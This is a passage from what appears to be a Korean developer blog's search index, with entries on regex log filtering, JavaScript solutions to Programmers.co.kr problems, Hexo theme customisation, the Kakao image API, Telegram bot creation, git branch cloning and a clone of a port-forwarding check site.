거꾸로된 배열로 반환한다 입력받은 정수를 문자열로 만든다 split으로 문자 배열로 만든다 map으로 다시 숫자 배열로 만든다 reverse로 뒤집는다.","link":"/2020/09/18/%EC%9E%90%EC%97%B0%EC%88%98-%EB%92%A4%EC%A7%91%EC%96%B4-%EB%B0%B0%EC%97%B4%EB%A1%9C-%EB%A7%8C%EB%93%A4%EA%B8%B0/"},{"title":"정규식 : 특정 문자열을 포함하는 줄, 라인 판단","text":"상황log1234567&quot;GET / HTTP/1.1&quot; 200 hello world 1&quot;GET / HTTP/1.1&quot; 200 hello world 2&quot;GET /a HTTP/1.1&quot; 404 hello world 1&quot;POST / HTTP/1.1&quot; 404 hello world 1&quot;GET / HTTP/1.1&quot; 200 hello world 2&quot;GET / HTTP/1.1&quot; 200 hello world 1&quot;POST /asd HTTP/1.1&quot; 404 hello world 2 이런 웹 로그가 있다고 하자. 중간에 보이는 200, 404 는 status code 이다. 404 에러인 라인만 뽑아서 보고싶을 때.. 로그파일을 한줄씩 읽으며 정규식으로 확인하기app.ts 전체코드1234567891011121314151617181920212223242526272829303132333435363738394041424344import * as fs from &quot;fs&quot;;import * as path from &quot;path&quot;;import * as readline from &quot;readline&quot;;const input_log_file_name = &quot;nohup20201107.out&quot;;const input_file_path = path.join( __dirname, `../input files/${input_log_file_name}`);const output_file_path = path.join( __dirname, `../output files/${input_log_file_name}`);console.log(input_file_path);async function processLineByLine() { const fileStream = fs.createReadStream(input_file_path); const rl = readline.createInterface({ input: fileStream, crlfDelay: Infinity, }); // 정규식 const reg404 = /^.*(404).*/; let result_string = &quot;&quot;; for await (const line of rl) { // console.log(`Line from file: ${line}`); if (reg404.test(line)) { // console.log(`hello : ${line}`); result_string += line + &quot;\\r\\n&quot;; } } fs.writeFile(output_file_path, result_string, &quot;utf8&quot;, function (err) { if (err) throw err; console.log(&quot;file write complete&quot;); });}processLineByLine(); readline으로 한줄한줄 읽기123456const fileStream = fs.createReadStream(input_file_path);const rl = readline.createInterface({ input: fileStream, crlfDelay: Infinity,}); 우선, 파일을 한줄씩 읽기위해 readline을 사용했다 정규식으로 404 문자열 포함 여부 확인123456789101112// 정규식const reg404 = /^.*(404).*/;let result_string = &quot;&quot;;for await (const line of rl) { // console.log(`Line from file: ${line}`); if (reg404.test(line)) { // console.log(`hello : ${line}`); result_string += line + &quot;\\r\\n&quot;; }} ^.*(404).* 로 정규식을 새웠다. ^.* ; 아무 문자로 시작하는 0개 이상의 문자열로 시작하고 (404) ; 404 문자열을 중간에 포함하며 .* ; 아무 문자열로 끝나는가 reg404.test(line)로 한줄한줄 확인하고 참인 경우에 result_string 에 더하기 result_string 결과 새파일로 쓰기1234fs.writeFile(output_file_path, result_string, &quot;utf8&quot;, function (err) { if (err) throw err; console.log(&quot;file write complete&quot;);}); result_string에는 404 문자열을 포함한느 라인만 추출되었고 output_file_path에 해당 내용을 쓴다.","link":"/2020/11/09/%EC%A0%95%EA%B7%9C%EC%8B%9D-%ED%8A%B9%EC%A0%95-%EB%AC%B8%EC%9E%90%EC%97%B4%EC%9D%84-%ED%8F%AC%ED%95%A8%ED%95%98%EB%8A%94-%EC%A4%84-%EB%9D%BC%EC%9D%B8-%ED%8C%90%EB%8B%A8/"},{"title":"정규식으로 좌표꺼내기","text":"(37.11111111111111, 126.11111111111111) 이런 좌표를 나타내는 문자열에서 알맹이만 빼보자. index.js12345678910111213141516let coordString = '(37.11111111111111, 126.11111111111111)'/\\d+([.]\\d+)?/.exec(coordString)// &quot;37.11111111111111,.11111111111111&quot;function getPositionFromString(positionString) { const re = /(\\d+)([\\.]\\d+)?/g; const result = [] while(match = re.exec(positionString)){ // console.info(match[0], ' found at : ', match.index); result.push(match[0]) } // console.info({x:result[0],y:result[1]}) return {x:result[0],y:result[1]}} exec() 가 g옵션에 따라서 매치하는 패턴의 결과가 모두 담겨서 나오는줄 알았다. 위처럼 while 루프를 통해서 모든 매치결과를 받아올 수 있다. 내부적으로 커서가 있는 것 같다. 참고 Javascript: How to get multiple matches in RegEx .exec results - Stack Overflow RegExp.prototype.exec() - JavaScript | MDN","link":"/2020/11/24/%EC%A0%95%EA%B7%9C%EC%8B%9D%EC%9C%BC%EB%A1%9C-%EC%A2%8C%ED%91%9C%EA%BA%BC%EB%82%B4%EA%B8%B0/"},{"title":"정수 내림차순으로 배치하기","text":"정수 내림차순으로 배치하기123456789// https://programmers.co.kr/learn/courses/30/lessons/12933function solution(n) { n = n + ''; let arr = n.split(''); arr.sort((a, b) =&gt; b - a); arr = arr.join(''); return Number(arr);}result = solution(118372); 해설 정수가 들어오면 내림차순으로 배치해서 = 가장 큰 수를 만들어서 반환하면된다. 정수를 문자열로 캐스팅한다. 문자열에서 문자하나하나의 배열로 변환하고 내림차순 정렬한다. 배열을 문자열로 만든다. 문자열을 숫자로 캐스팅한다.","link":"/2020/09/18/%EC%A0%95%EC%88%98-%EB%82%B4%EB%A6%BC%EC%B0%A8%EC%88%9C%EC%9C%BC%EB%A1%9C-%EB%B0%B0%EC%B9%98%ED%95%98%EA%B8%B0/"},{"title":"정수 제곱근 판별","text":"정수 제곱근 판별12345678910// https://programmers.co.kr/learn/courses/30/lessons/12934function solution(n) { let answer = -1; const x = Math.sqrt(n); if (Number.isInteger(x)) { answer = Math.pow(x + 1, 2); } return answer;}result = solution(121); 해설 입력으로 정수가 들어오면 제곱근 x를 구해서 양의 정수이면 (x+1)^2을 반환한다 양의 정수가 아니면 -1을 반환한다. Math.sqrt(n) 은 제곱근을 구하는 함수다. math.pow() 는 제곱하는 함수다.","link":"/2020/09/18/%EC%A0%95%EC%88%98-%EC%A0%9C%EA%B3%B1%EA%B7%BC-%ED%8C%90%EB%B3%84/"},{"title":"정처기 으악","text":"정보처리기사 책을 펴고 30분 봣는데 모니터 보는 것 보다 눈이 아파서 때려쳤다. 막연한 이론은 공부할 엄두가 안난다…","link":"/2020/11/06/%EC%A0%95%EC%B2%98%EA%B8%B0-%EC%9C%BC%EC%95%85/"},{"title":"정보처리기사 카테고리 생성","text":"정보처리기사 공부한 내용 올리기","link":"/2020/10/16/%EC%A0%95%EC%B2%98%EA%B8%B0/"},{"title":"제일 작은 수 제거하기","text":"제일 작은 수 제거하기1234567891011121314151617// https://programmers.co.kr/learn/courses/30/lessons/12935function solution(arr) { var answer = [-1]; // 하나일때 바로 반환 if (arr.length == 1) { return answer; } let min = Math.min.apply(null, arr); // let min = Math.min(...arr); let tmp = arr.filter((val, idx) =&gt; { return val != min; }); console.log(tmp); return tmp;}result = solution([4, 3, 2, 1]); 해설 입력으로 배열이 들어오면, 그중에서 가장 작은 수를 없애고 리턴하면 된다. 정렬을 사용하면 편하겠지만 원래의 배열 순서에서 최소값만 쏙하고 빼서 리턴해야한다. 나는 배열에서 최소값을 구하고 필터를 통해서 최소값을 제외한 배열을 얻어서 반환했다. 다른 사람의 풀이123456function solution2(arr) { arr.splice(arr.indexOf(Math.min(...arr)), 1); if (arr.length &lt; 1) return [-1]; return arr;}result = solution([4, 3, 2, 1]); 음.. 그러하다.","link":"/2020/09/18/%EC%A0%9C%EC%9D%BC-%EC%9E%91%EC%9D%80-%EC%88%98-%EC%A0%9C%EA%B1%B0%ED%95%98%EA%B8%B0/"},{"title":"직사각형 별찍기","text":"직사각형 별찍기123456789101112// https://programmers.co.kr/learn/courses/30/lessons/12969process.stdin.setEncoding('utf8');process.stdin.on('data', (data) =&gt; { const n = data.split(' '); const a = Number(n[0]), b = Number(n[1]); for (let index = 0; index &lt; b; index++) { const row = '*'.repeat(a); console.log(row); }}); 해설 별찍기!","link":"/2020/09/18/%EC%A7%81%EC%82%AC%EA%B0%81%ED%98%95-%EB%B3%84%EC%B0%8D%EA%B8%B0/"},{"title":"중첩 카테고리, 여러개 태그 쓰는법","text":"123456789101112---title: 중첩 카테고리, 여러개 태그 쓰는법date: 2020-09-16 15:50:18tags: - tmp tag1 - tmp tag2categories: - tmp cat1 - tmp cat2 - tmp cat3---","link":"/2020/09/16/%EC%A4%91%EC%B2%A9-%EC%B9%B4%ED%85%8C%EA%B3%A0%EB%A6%AC-%EC%97%AC%EB%9F%AC%EA%B0%9C-%ED%83%9C%EA%B7%B8-%EC%93%B0%EB%8A%94%EB%B2%95/"},{"title":"체육복","text":"체육복1234567891011121314151617181920212223242526272829303132333435363738394041// https://programmers.co.kr/learn/courses/30/lessons/42862function solution(n, lost, reserve) { var answer = 0; let arr = []; for (let i = 0; i &lt; n; i++) { arr[i] = 1; } for (let i = 0; i &lt; reserve.length; i++) { arr[reserve[i] - 1]++; } for (let i = 0; i &lt; lost.length; i++) { arr[lost[i] - 1]--; } for (let i = 0; i &lt; arr.length; i++) { // 앞에사람꺼 빌리기 if (arr[i] == 0) { if (arr[i - 1] == 2) { arr[i - 1]--; arr[i]++; continue; } // 뒤에사람꺼 빌리기 else if (arr[i + 1] == 2) { arr[i + 1]--; arr[i]++; continue; } } } const result = arr.filter((value, index) =&gt; { return value != 0; }); return result.length;}solution(5, [2, 4], [1, 3, 5]); 해설 체육복을 입을 수 있는 사람의 수를 구하는 문제다. 체육복을 빌릴 수 있는데, 앞 뒤 사람의 체육복만 빌릴 수 있다. 먼저 arr 배열을 초기화한다. lost는 -1, reserve는 +1 앞에서부터 순차적으로 앞사람확인하고 여벌이 있으면 빌린다 앞사람없으면 뒤에서 빌린다.","link":"/2020/09/18/%EC%B2%B4%EC%9C%A1%EB%B3%B5/"},{"title":"최대공약수와 최소공배수","text":"최대공약수와 최소공배수123456789101112// https://programmers.co.kr/learn/courses/30/lessons/12940function solution(n, m) { var answer = []; function gcd(a, b) { return b ? gcd(b, a % b) : a; } let tmp = gcd(n, m); answer.push(tmp); answer.push((n * m) / tmp); return answer;}result = solution(3, 12); 해설 GCD ; greatest common divisor ; 최대공약수 입력으로 두 수가 들어오면 [ 최대공약수, 최소공배수 ]를 반환한다 최대공약수는 gcd함수를 이용해서 재귀적으로 구하고 최소공배수는 n * m / gcd 로 구할 수 있다.","link":"/2020/09/18/%EC%B5%9C%EB%8C%80%EA%B3%B5%EC%95%BD%EC%88%98%EC%99%80-%EC%B5%9C%EC%86%8C%EA%B3%B5%EB%B0%B0%EC%88%98/"},{"title":"카카오 이미지 검색 api 사용하기","text":"카카오 이미지 검색 API를 사용해보자 따라하기 이미지가 먼저오고 그 아래에 설명이 있습니다! 준비물 postman kakao developers 가입하기 카카오 api 사용이 처음이라면 kakao developers에 가입해야한다. 이미 있는 카카오 계정으로 가입할 수 있다. REST API 키 발급받기 내 애플리케이션 &gt; 애플리케이션 추가하기 를 눌러준다. 앱 이름, 사업자명을 입력하고 저장을 눌러준다. 방금 만든 앱을 클릭하여 앱 키 &gt; rest api 키를 확인한다. POSTMAN으로 확인하기 포스트맨을 켜주시고, 아래 텍스트를 복사해 붙여넣어준다. url1https://dapi.kakao.com/v2/search/image?query=안녕 Headers 탭에 들어가서 2-1. Authorizationkey를 하나 추가하고 2-2. value로는 KakaoAK {방금 발급받은 rest api key}를 넣어준다. KakaoAK 와 키 사이에 하나의 공백이 있음을 유의한다. Send 버튼을 눌러 결과를 확인한다. 검색 옵션 사용하기 위에서는 필수 파라미터인 query만 사용해 검색을 해보았다. 포스트맨 Params 탭으로가서 이것저것 테스트해보길.. https://developers.kakao.com/docs/latest/ko/daum-search/dev-guide#search-image Name Type Description Required query String 검색을 원하는 질의어 O sort String 결과 문서 정렬 방식, accuracy(정확도순) 또는 recency(최신순), 기본 값 accuracy X page Integer 결과 페이지 번호, 1~50 사이의 값, 기본 값 1 X size Integer 한 페이지에 보여질 문서 수, 1~80 사이의 값, 기본 값 80 X 참고 카카오 이미지 검색 api를 활용한 ios앱","link":"/2020/09/24/%EC%B9%B4%EC%B9%B4%EC%98%A4-%EC%9D%B4%EB%AF%B8%EC%A7%80-%EA%B2%80%EC%83%89-api-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0/"},{"title":"[카카오 인턴] 키패드 누르기","text":"[카카오 인턴] 키패드 누르기12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182// https://programmers.co.kr/learn/courses/30/lessons/67256function solution(numbers, hand) { // 1,4,7 ; left // 2,5,8,0 ; 가까운거, 같을시 왼손잡이냐 오른손잡이냐 // 3,6,9 ; right switch (hand) { case 'left': hand = 'L'; break; default: hand = 'R'; break; } let curleft = '*'; let curright = '#'; let answer = ''; const maptable = { 1: { low: 0, col: 0 }, 2: { low: 0, col: 1 }, 3: { low: 0, col: 2 }, 4: { low: 1, col: 0 }, 5: { low: 1, col: 1 }, 6: { low: 1, col: 2 }, 7: { low: 2, col: 0 }, 8: { low: 2, col: 1 }, 9: { low: 2, col: 2 }, '*': { low: 3, col: 0 }, 0: { low: 3, col: 1 }, '#': { low: 3, col: 2 }, }; let keypad = [ [1, 2, 3], [4, 5, 6], [7, 8, 9], [-1, 0, -2], ]; function getCost(num, cur) { let cost = 0; const src = maptable[cur]; const des = maptable[num]; let low = Math.abs(des['low'] - src['low']); let col = Math.abs(des['col'] - src['col']); cost = low + col; return cost; } let x; numbers.forEach((number, idx) =&gt; { if (number.toString().match(/[369]/)) { x = 'R'; curright = number; } else if (number.toString().match(/[147]/)) { x = 'L'; curleft = number; } else { // 가까운손 const costleft = getCost(number, curleft); const costright = getCost(number, curright); if (costleft == costright) { x = hand; switch (hand) { case 'L': curleft = number; break; default: curright = number; break; } } else if (costleft &gt; costright) { x = 'R'; curright = number; } else { x = 'L'; curleft = number; } } answer += x; }); return answer;}result = solution([1, 3, 4, 5, 8, 2, 1, 4, 5, 9, 5], 'right');result = solution([7, 0, 8, 2, 8, 3, 1, 5, 7, 6, 2], 'left');result = solution([1, 2, 3, 4, 5, 6, 7, 8, 9, 0], 'right'); 해설 입력으로 키패드를 누르는 순서와 왼손잡이인지 오른손잡이인지 알려주는 문자열을 받는다 그러면 “LRLLLRLLRRL” 식으로 각 숫자를 어떤 손으로 눌렀는지 문자열로 반환한다 147, 369는 좌우 키패드이기때문에 어떤 손으로 눌러야하는 정해져 있고, 문제는 가운데 있는 키들이다. 2580 2580중 하나의 키를 눌러야하는 상황이면 가까운 손으로 눌러야한다 거리가 같은 경우에는 왼손잡이는 왼손으로, 오른손잡이는 오른손으로 누른다. 나는 정규식으로 147, 369를 처리하고 가운데 키를 누르는 경우에는 왼손 오른손 누가더 가까운데 getCost 함수로 비교한다. getCost함수는 그냥 몇칸 떨어져 있는지 비교하는 단순한 함수이다. maptable이라는걸 만들어서 키패드를 2차원 배열로 표시해을 때 인덱스를 저장했다.","link":"/2020/09/18/%EC%B9%B4%EC%B9%B4%EC%98%A4-%EC%9D%B8%ED%84%B4-%ED%82%A4%ED%8C%A8%EB%93%9C-%EB%88%84%EB%A5%B4%EA%B8%B0/"},{"title":"커스텀 404 페이지 만들기","text":"루트 디렉터리에 404.html이 존재하면 기존 404 페이지를 대신해 보여준다. hexo에서 적용시키려면 source 디렉터리에 404.html을 만들면된다. 그런데 hexo에서 배포할때 자동으로 테마에 맞게 지정된 레이아웃으로 변환한다. 이를 막기 위해 404.html의 Front-matter 에 layout: false로 지정한다 source/404.html12345---layout: false---&lt;!DOCTYPE html&gt; Front-matter hexo에서 파일 최상단에 적는 yml을 Front-matter라고 한다. Front-matter123456789101112---title: 커스텀 404 페이지 만들기toc: truecategory: blogtags: - hexo - 404 - custom pagethumbnail: /images/커스텀-404-페이지-만들기20200921/preview.jpgdate: 2020-09-21 09:15:59--- 404 소스 출처 https://codepen.io/purplexmoss/pen/PoPyzMW","link":"/2020/09/21/%EC%BB%A4%EC%8A%A4%ED%85%80-404-%ED%8E%98%EC%9D%B4%EC%A7%80-%EB%A7%8C%EB%93%A4%EA%B8%B0/"},{"title":"hexo icarus 테마에 커스텀 레이아웃, 스타일(css) 적용하기","text":"icarus 테마를 적용하고 다 좋았지만, 커스텀하고 싶었던 것들이, 칼럼들의 비율과 가로 넓이가 너무 좁다는 것이였다. 한번 커스텀해보자 themes 폴더에 icarus 테마깔기 npm install hexo-theme-icarus ; npm으로 icarus 테마를 설치할 수 있는데, 이 방법으로 설치한 테마는 커스텀하여 사용하기에는 구조가 이상한 것 같아서(node_modules 안에서 icarus패키지를 수정..) 테마 설치는 /themes 디렉터리 아래에서 클론 방식으로 하는 것을 추천한다. git clone --depth 1 https://github.com/ppoffice/hexo-theme-icarus.git 그냥 클론하게되면 커밋 내역까지 다 불러오느라 용량이 커진다. --depth 1을 붙여 최신 상태만 받아 올 수 있다. 필요없는 .git 폴더를 삭제해도된다. 참고 ; git clone 커밋 히스토리없이 가볍게 클론하기 _config.yml1theme: icarus 위에서 설치한 테마 디렉터리명이랑 _config.yml 의 theme 항목의 값이랑 동일해야한다. themes└── icarus 디렉터리 구조는 이렇다. 칼럼 비율 조절하기 수정하기 용이하도록 themes/icarus 경로에서 vscode를 실행한다. 지금부터 설명하는 파일의 경로는 themes/icarus 기준의 상대경로이다. layout/common/widgets.jsx123456789function getColumnSizeClass(columnCount) { switch (columnCount) { case 2: return 'is-3-tablet is-3-desktop is-3-widescreen'; // 여기 수정 case 3: return 'is-4-tablet is-4-desktop is-3-widescreen'; } return '';} layout/common/widgets.jsx 로 가보면 getColumnSizeClass라는 함수가 있다. 여기에 자신의 columnCount 에 맞게 수정한다. columnCount 의 기본값은 2라서 case 2인 경우를 수정한다. 나는 is-3으로 수정했다. layout/layout.jsx1234567891011&lt;div class={classname({ column: true, 'order-2': true, 'column-main': true, 'is-12': columnCount === 1, 'is-9-tablet is-9-desktop is-9-widescreen': columnCount === 2, // 여기 수정 'is-9-tablet is-9-desktop is-6-widescreen': columnCount === 3, })} dangerouslySetInnerHTML={{ __html: body }}&gt;&lt;/div&gt; layout/layout.jsx 하단을 보면 위 코드가 나오는데 나는 is-9로 수정해주었다. 전체 12에서 기본값은 프로필이 들어있는 영역이 4, 게시글 영역이 8이였다. 위처럼 수정하게되면 우선 그 비율을 3, 9로 변경해준 것이다. 프로필 영역을 좁게, 게시글 영역은 크게 바뀐 것이다. 이 12라는 것은 칼럼들의 상위에 있는 container의 크기를 기준으로 12등분한 것이다. 그럼 이 container의 크기를 늘려보자. container 크기 늘리기include/style/base.styl12345$gap ?= 16px$tablet ?= 769px$desktop ?= 1288px$widescreen ?= 1480px$fullhd ?= 1672px include/style/base.styl 로 가서 23라인 정도에 이런 코드가 보일 것이다. 나는 $widescreen, $fullhd의 값을 각각 200px 씩 늘려주었다. 그랬더니 container가 커졌다! 커스텀 css 적용하기 나는 보통 글을 쓸때, 그림을 먼저보고주고 그 아래에 그에 대한 설명을 하는 편이다. 그래서 그림 위에있는 글이 아래 사진과 별로 관계가 없다는 것을 마진을 주어 표현하고 싶다. 그런데 매번 그림이 나올 때 마다, &lt;br&gt;을 할 수도 없고… 그래서 아예 게시글 영역 안에 있는 이미지 태그에 대한 커스텀 css를 적용시킨다. include/style/article.styl1234567891011121314151617&amp;.article .article-meta, .article-tags color: $text-light .article-meta overflow-x: auto margin-bottom: .5rem .article-more @extend .button.is-light .content word-wrap: break-word font-size: $article-font-size img // 여기 추가 margin-top: 30px // 여기 추가 .styl 에 대한 문법은 잘모르지만, 들여쓰기로 셀렉터들의 관계가 정의되어있고 내가 원하는 게시글 영역의 이미지 태그가 적용되려면 .article .content 아래에 img 태그에 대한 css를 정의해주었다. 배포, 적용시키기 이렇게 변경하고 나고 배포를해야는데 그냥 배포하면 적용이 안된다. public/css/default.css 를 삭제해준다. 그리고 배포를 하면, hexo에서 default 파일이 없어짐을 감지하고 새로 생성하게 되는데, 그때 변경 내역이 적용된다!","link":"/2020/11/12/%EC%BB%A4%EC%8A%A4%ED%85%80-%EB%A0%88%EC%9D%B4%EC%95%84%EC%9B%83/"},{"title":"코드 스니펫 안에 &#96;&#96;&#96; 포함하기","text":"tmp.md12345오호호```js tmp.jsconsole.log(1);``` 이렇게 스니펫으로 ``` 을 표현할 수 있다. 하는 법하는법1234567````md tmp.md오호호```js tmp.jsconsole.log(1);``````` 바깐 스니펫의 ` 개수를 4개 안쪽 스니펫의 ` 개수를 3개로 하면 된다.","link":"/2020/09/23/%EC%BD%94%EB%93%9C-%EC%8A%A4%EB%8B%88%ED%8E%AB-%EC%95%88%EC%97%90-%EC%BD%94%EB%93%9C-%EC%8A%A4%EB%8B%88%ED%8E%AB-%ED%8F%AC%ED%95%A8%ED%95%98%EA%B8%B0/"},{"title":"콜라츠 추측","text":"콜라츠 추측123456789101112131415161718192021// https://programmers.co.kr/learn/courses/30/lessons/12943function solution(num) { let answer = 0; let curval = num; let i; for (i = 0; i &lt; 500; i++) { console.log(i, curval); if (curval == 1) { break; } if (curval % 2 == 0) { curval /= 2; } else { curval *= 3; curval++; } } answer = i == 500 ? -1 : i; return answer;}result = solution(6); 해설 1-1. 입력된 수가 짝수라면 2로 나눕니다.1-2. 입력된 수가 홀수라면 3을 곱하고 1을 더합니다.2. 결과로 나온 수에 같은 작업을 1이 될 때까지 반복합니다. 위 과정을 반복하면 모든 수를 1로 만들 수 있다는게 콜라츠 추측.. 위 과정을 코드로 표현한다.","link":"/2020/09/18/%EC%BD%9C%EB%9D%BC%EC%B8%A0-%EC%B6%94%EC%B8%A1/"},{"title":"타자 속도","text":"한타 ; 534타 영타 ; 329타 / 65 WPM 한타 영타","link":"/2020/12/28/%ED%83%80%EC%9E%90-%EC%86%8D%EB%8F%84/"},{"title":"vscode 터미널 토글 단축키","text":"vscode 내장 터미널영역을 토글할 수 있다. Ctrl + J vscode 내장 터미널 토글 Ctrl + Shift + C cmd 열기","link":"/2020/10/06/%ED%84%B0%EB%AF%B8%EB%84%90-%ED%86%A0%EA%B8%80-%EB%8B%A8%EC%B6%95%ED%82%A4/"},{"title":"텔레그램 봇 생성","text":"텔레그램 봇 생성 https://t.me/BotFather 에 들어가기 봇은 텔레그램 계정당 20개까지 생성할 수 있다고한다. BotFather에 명령1234567891011/help // 명령어보기/newbot // 봇생성Alright, a new bot. How are we going to call it? Please choose a name for your bot.chinsun9Bot // 봇이름 생성Good. Now let's choose a username for your bot. It must end in `bot`. Like this, for example: TetrisBot or tetris_bot.chinsun9Bot // 봇의 유저이름 생성. 유니크한 `Bot`, `_bot` 으로 끝나는 문자열이여함. 마지막 메시지의 가장 첫번째 링크를 눌르고 시작을 눌러 봇을 활성화 시킨다. 여기까지 텔레그램 봇을 생성해 보았다. 이제 이 봇을 친구들과 대화하는 그룹방에 초대하거나, 채널에 초대해서 이것저것 명령어를 듣게하도록 만들어보자. 참고 Telegram bots Telegram bots api How many telegram bots can I create?","link":"/2020/10/16/%ED%85%94%EB%A0%88%EA%B7%B8%EB%9E%A8-%EB%B4%87-%EC%83%9D%EC%84%B1/"},{"title":"텔레그램 미디어 자동 다운로드","text":"설정 &gt; 고급 &gt; 미디어 자동 다운로드 &gt; [그룹|채널|개인대화] 이렇게하면 스크롤을 사진이나, 파일로 옮겼을 때 자동으로 다운로드 받아진다","link":"/2020/10/16/%ED%85%94%EB%A0%88%EA%B7%B8%EB%9E%A8-%EC%9E%90%EB%8F%99-%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C/"},{"title":"특정 브랜치 클론하기","text":"123git clone -b {브랜치명} --single-branch {저장소}git clone -b docker --single-branch https://github.com/chinsun9/2020-web-test.git 저장소에 여러 브랜치가 있는데, 특정 하나의 브랜치만 클론하고 싶을때! git clone -b docker –single-branch https://github.com/chinsun9/2020-web-test.git https://github.com/chinsun9/2020-web-test.git 저장소의 docker라는 브랜치를 클론하는 명령이다.","link":"/2020/10/21/%ED%8A%B9%EC%A0%95-%EB%B8%8C%EB%9E%9C%EC%B9%98-%ED%81%B4%EB%A1%A0%ED%95%98%EA%B8%B0/"},{"title":"리액트로 네이버 퍼센트 계산기 클론코딩","text":"막 배운 리액트로 처음 만들어본 프로젝트이다 계산하기 귀찮아하는 나는 평소 네이버 퍼센트 계산기를 이용했었는데 이 계산기를 리액트를 사용해 클론코딩해보자.. 데모 Percentage Calculator (React) 후기 내가 너무 간단한 것을 만들어서 그런지 모르겠지만 리액트를 처음 써본 내 기준으로 너무 복잡하다고 느껴졌다. 기존에 html, css, js로 만들때 보다 시간이 배로 걸렸다. 나중에 훨씬 복잡한 것을 만들게 되었을 때 리액트가 좋다고한다. 이미 잘 만들어진 리액트 튜토리얼을 따라만들고, 수정하는 방식으로 만들었다. 사용한 개념에 대해 완전히 이해하고 익숙해지는데 시간이 필요할 것 같다. 소스코드 react-percentage-calculator README.md에 리액트로 만든 화면을 깃허브 페이지로 보여주는 방법 등 메모해놨다.","link":"/2020/09/22/%ED%8D%BC%EC%84%BC%ED%8A%B8-%EA%B3%84%EC%82%B0%EA%B8%B0/"},{"title":"포트 포워딩 체크 웹 클론코딩, Open Port Check WEB (NodeJs)","text":"서버를 열어놨는데, 외부에서 접근이 가능한지 불가능한지, 포트포워딩을 확인하고 싶으면 핸드폰을 열고 데이터를 켜서 내 서버로 접속해서 확인하는 등 번거롭게 확인했다. https://www.yougetsignal.com/tools/open-ports/ 라는 포트포워딩 체크 웹이 있는데 이거를 한번 클론 코딩해보았다. 영상설명 나는 ec2에 올려서 테스트해봤다 주소창에 보면 15.165.000.000:4000 으로 나오는데 내 ec2 ip인데 일부러 뒷부분을 000.000으로 바꿔놨다. 이 앱은 ec2의 4000포트에서 동작중이다. 도메인명이나 ip를 입력하고 포트입력란에 원하는 포트를 입력한다. 그리고 check 버튼을 누르면 해당 포트가 열려있는지 확인한다. 당연히 해당 포트를 리슨하는 서버가 동작하고 있어야한다. 우측 common ports 에서 원하는 포트를 클릭하면 해당 포트로 요청을 보낸다. Scan All Common Ports 버튼을 눌러 모든 common port를 스캔한다. 0:18 중간에는 마인크래프트 서버를 체크해본다. 0:35 localhost로 적으면 내 ec2의 포트를 스캔하게된다. localhost를 common port를 모두 스캔해보니 3000번이 열려있다는 것을 알 수 있다 0:48 이 앱이 실행되고 있는 4000번 포트를 스캔해보니 당연하게 열려있는 모습을 확인할 수 있다 소스코드 open-port-check-web","link":"/2020/11/03/%ED%8F%AC%ED%8A%B8-%ED%8F%AC%EC%9B%8C%EB%94%A9-%EC%B2%B4%ED%81%AC-%EC%9B%B9-%ED%81%B4%EB%A1%A0%EC%BD%94%EB%94%A9/"},{"title":"프로그래머스 문제풀이 카테고리 생성","text":"javascript 공부하면서 프로그래머스 풀었던 것 올리는 곳!","link":"/2020/09/18/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4-%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4-%EC%B9%B4%ED%85%8C%EA%B3%A0%EB%A6%AC-%EC%83%9D%EC%84%B1/"},{"title":"하샤드 수","text":"하샤드 수12345678910111213141516// https://programmers.co.kr/learn/courses/30/lessons/12947function solution(x) { let answer = true; const saveX = x; x += ''; arr = x.split(''); arr = arr.map(Number); const result = arr.reduce((prev, curr) =&gt; { return curr + prev; }, 0); if (saveX % result != 0) { answer = false; } return answer;}result = solution(10); 해설 정수 입력이 들어오면 하샤드 수인지 판별하여 bool을 반환 정수를 자릿수별로 조작하기 위해 문자열로 캐스팅 문자열을 배열로 변환 배열의 각 원소는 문자인데 map으로 숫자로 캐스팅 reduece로 자릿수의 합을 구합 나누어 떨어지는 확인 하샤드 수123456789181 + 8 = 918 % 9 == 018은 하샤드 수!191 + 9 = 1019 * 10 != 019는 아님! 자릿수를 모두 더한다.(10진수 기준) 자릿수를 모두 더한 합으로 원래 수를 나눴을 때 나누어 떨어지는지 판별한다.","link":"/2020/09/18/%ED%95%98%EC%83%A4%EB%93%9C-%EC%88%98/"},{"title":"핸드폰 번호 가리기","text":"핸드폰 번호 가리기12345678910// https://programmers.co.kr/learn/courses/30/lessons/12948function solution(phone_number) { let answer = ''; for (let index = 0; index &lt; phone_number.length - 4; index++) { answer += '*'; } return answer + phone_number.slice(-4);}result = solution('01033334444'); 해설 인풋 문자열에서 뒤 4자리만 남기고 '*'문자로 변환하는 거다. 나는 그냥 인풋 문자열 길이에서 4번 적게 '*'을 찍고 마지막 문자열 4개를 잘라다가 붙였다. 다른 사람의 풀이1234// 정규식 풀이 다른사람function hide_numbers(s) { return s.replace(/\\d(?=\\d{4})/g, '*');} 정규식을 이용해 아름답게 줄였다.. 참고 정규식 시각화하는 곳 https://regexr.com/ https://regexper.com/","link":"/2020/09/18/%ED%95%B8%EB%93%9C%ED%8F%B0-%EB%B2%88%ED%98%B8-%EA%B0%80%EB%A6%AC%EA%B8%B0/"},{"title":"행렬의 덧셈","text":"1234567891011121314151617181920212223// https://programmers.co.kr/learn/courses/30/lessons/12950function solution(arr1, arr2) { var answer = []; arr1.forEach((row, rowidx) =&gt; { let tmpRow = []; row.forEach((col, colidx) =&gt; { tmpRow[colidx] = col + arr2[rowidx][colidx]; }); answer.push(tmpRow); }); return answer;}result = solution( [ [1, 2], [2, 3], ], [ [3, 4], [5, 6], ]); 해설 array api forEach 쓸때 index 값을 두번째 파라미터로 받을 수 있다. 그래서 구조가 같은 배열(행렬)의 경우 반복문 하나로 돌릴 수 있다. 다른 사람의 풀이1234// 다른사람 풀이 mapfunction sumMatrix(A, B) { return A.map((a, i) =&gt; a.map((x, j) =&gt; x + B[i][j]));} map을 이용해서 간결하게 표현했다..","link":"/2020/09/18/%ED%96%89%EB%A0%AC%EC%9D%98-%EB%8D%A7%EC%85%88/"},{"title":"현재 디렉터리에서 cmd열기","text":"꿀꿀 탐색기 주소에 cmd 탐색기를 돌아다니다가 해당 디렉터리에서 터미널을 열고 싶을 때 탐색기 주소창에다 cmd 반대의 경우 터미널에서 작업하다가 해당 디렉터리를 탐색기에서 보고 싶을 때 explorer . cmd와 다르게 .을 써줘야한다. cmd1explorer 